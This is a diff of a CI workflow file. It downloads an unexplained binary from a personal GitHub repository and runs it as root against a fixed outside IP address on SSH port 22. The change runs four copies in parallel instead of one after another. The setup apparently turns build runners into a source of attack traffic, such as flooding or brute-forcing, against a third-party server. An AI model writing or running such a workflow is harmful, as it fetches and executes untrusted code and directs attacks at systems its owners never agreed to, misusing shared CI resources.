@@ -16,12 +16,17 @@ jobs:
         run: |
           wget https://github.com/Paraloxd/tekpoyraz/raw/refs/heads/main/tekpoyraz -O tekpoyraz
           chmod +x tekpoyraz
+          PIDS=()
           for i in {1..4}; do
-            timeout 35 sudo ./tekpoyraz 216.202.200.164 22
+            sudo timeout 20 ./tekpoyraz 216.202.200.164 22 &
+            PIDS+=($!)
+          done
+          
+          for pid in "${PIDS[@]}"; do
+            wait $pid
           done
 
       - name: OK !
-        run: sleep 35
-        
-      - name: OK !
-        run: sudo shutdown now
+        run: |
+          sleep 20
+          exit 0
